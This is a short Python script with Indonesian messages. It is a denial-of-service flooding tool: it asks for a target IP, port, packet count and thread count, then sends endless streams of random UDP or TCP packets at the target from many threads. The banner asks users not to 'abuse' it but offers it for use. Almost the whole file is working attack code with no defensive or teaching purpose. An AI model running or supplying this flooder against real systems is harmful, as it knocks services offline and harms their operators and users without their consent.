#!/usr/bin/env python3
#TOOLS BY DevXyZ
import random
import socket
import threading

print       (" AUTHOR : DevXyZ ") #JAGAN LU GANTI INI
print       (" DISCORD : DevXyZ#9213 ") #INI JUGA
print       (" REMAKE : BY ZX ") #INI TERSERAH LU
print       (" kalau dah bisa jagan abuse ")                            print       (" gunain seperlunya aja ") #INI SMUA JGAN DI RUBAH KLW GX MAU ERROR PRINT
print       (" KALAU MAU REMAKE ")
print       (" RENAME DAN SEBAGAINYA PM GW ")
print       (" DISCORD GW DI ATAS NOH ")
    
ip = str(input("  Ip > "))
port = int(input(" Port > "))
choice = str(input(" GAS? (y/n) > "))
times = int(input(" JUMLAH PAKET >"))
threads = int(input(" BARANGNYA > "))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PAKET GRATIS OTW >>>>")
		except:
			print("[!] SELAMAT MENIKMATI >>>>")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET GRATIS OTW >>>> ")
		except:
			s.close()
			print("[*] SELAMAT MENIKMATI >>>>")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()